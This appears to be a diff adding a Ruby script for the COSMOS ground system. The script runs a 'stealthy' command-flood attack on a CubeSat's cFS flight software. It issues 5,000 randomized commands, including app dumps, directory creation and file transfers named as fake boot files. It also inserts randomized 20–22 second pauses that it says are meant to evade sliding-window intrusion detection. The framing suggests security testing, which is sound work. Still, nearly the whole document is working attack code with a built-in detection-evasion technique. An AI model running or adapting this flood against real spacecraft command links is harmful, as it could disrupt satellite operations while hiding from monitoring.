@@ -1,0 +1,66 @@
+# Command Flood Simulation Script
+#
+# Description:
+#
+# This script simulates a stealthy command flood attack against a CubeSat’s
+# command and control subsystem.
+#
+# It issues exactly 5,000 diverse CFS commands drawn from core services
+# (e.g., CFE, FM, CF, TO, LC), with randomized parameters to mimic realistic
+# operational traffic rather than brute-force spamming.
+#
+# To evade simple sliding-window intrusion detection, 5% of the commands
+# (250 in total) are designated as "flush events." At these indices, the
+# script introduces long pauses of 20–22 seconds, deliberately breaking
+# temporal patterns and simulating bursts of disruptive traffic that appear
+# intermittent.
+
+
+require 'cosmos/script'
+
+TOTAL_CMDS = 5000
+FLUSH_EVENTS = (TOTAL_CMDS * 0.05).to_i  # % = 250 pauses
+
+# Preselect 250 unique command indices for long flush-style sleeps
+flush_indices = (0...TOTAL_CMDS).to_a.sample(FLUSH_EVENTS).to_set
+
+def pick_command
+  case rand(9)
+  when 0
+    ["CFE_ES_QUERY_ALL", { "QUERYALLFILENAME" => "/ram/appdump_#{rand(1000)}.txt" }]
+  when 1
+    ["FM_CREATE_DIR", { "DIRECTORY" => "/ram/flood_dir_#{rand(1000)}" }]
+  when 2
+    ["CF_TX_FILE", {
+      "CLASS" => 1, "KEEP" => 1, "CHAN_NUM" => 0, "PRIORITY" => 1,
+      "DEST_ID" => "0.21",
+      "SRCFILENAME" => "/data/tmpdummy#{rand(9999)}.bin",
+      "DSTFILENAME" => "/tmp/bootfake#{rand(9999)}.bin"
+    }]
+  when 3
+    ["CFE_EVS_FILE_WRITE_LOG_DATA", { "LOGFILENAME" => "/ram/logflood_#{rand(1000)}.evt" }]
+  when 4
+    ["CFE_SB_SEND_PREV_SUBS", {}]
+  when 5 then ["FM_NOOP", {}]
+  when 6 then ["LC_NOOP", {}]
+  when 7 then ["CFE_SB_NOOP", {}]
+  when 8 then ["TO_NOOP", {}]
+  end
+end
+
+def optimized_flood(flush_indices)
+  set_line_delay(0.0)  # base delay for stealth
+
+  TOTAL_CMDS.times do |i|
+    if flush_indices.include?(i)
+      puts ">> FLUSH EVENT at command #{i} — sleeping ≥20s to disrupt sliding window"
+      sleep(20 + rand * 2)  # 20–22 seconds  # 20–22 seconds
+    end
+
+    cmd_name, params = pick_command
+    cmd_raw("CFS", cmd_name, params)
+  end
+end
+
+optimized_flood(flush_indices)
+puts "Stealth flood complete."
